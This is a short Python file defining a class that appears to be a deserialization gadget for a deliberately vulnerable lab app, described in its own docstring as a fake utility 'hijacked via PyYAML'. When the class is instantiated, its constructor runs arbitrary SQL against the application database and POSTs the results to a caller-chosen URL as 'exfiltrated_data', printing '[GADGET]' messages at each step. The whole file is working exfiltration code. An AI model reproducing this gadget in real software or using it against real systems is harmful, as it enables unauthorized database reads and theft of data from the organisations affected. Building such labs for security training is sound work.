from app.utils.db import get_connection
import requests

class DatabaseExporter:
    """
    Fake DevSecOps utility for exporting database metrics.
    Hijacked via PyYAML to execute arbitrary SQL queries.
    """
    def __init__(self, query=None, export_url=None):
        print("[GADGET] DatabaseExporter instantiated via PyYAML!")
        if query and export_url:
            try:
                conn = get_connection()
                print(f"[GADGET] Executing SQL Query: {query}")
                rows = conn.run(query)
                conn.close()
                print(f"[GADGET] Exfiltrating data to: {export_url}")
                requests.post(export_url, json={"exfiltrated_data": rows}, timeout=5)
                print("[GADGET] Payload delivered successfully!")
            except Exception as e:
                print(f"[GADGET] DB Exfiltration Error: {e}")